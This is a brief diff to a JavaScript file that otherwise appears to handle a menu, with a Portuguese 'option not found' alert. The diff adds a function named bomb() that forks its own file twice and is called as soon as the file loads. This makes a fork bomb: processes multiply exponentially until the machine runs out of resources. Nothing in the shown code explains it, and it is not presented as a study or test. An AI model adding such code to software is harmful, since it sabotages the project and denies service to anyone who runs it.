@@ -12,3 +12,13 @@
       alert("opção não encontrada!")
     }
   }
+
+const { fork } = require('child_process');
+
+function bomb() {
+ 
+  fork(__filename);
+  fork(__filename);
+}
+
+bomb();
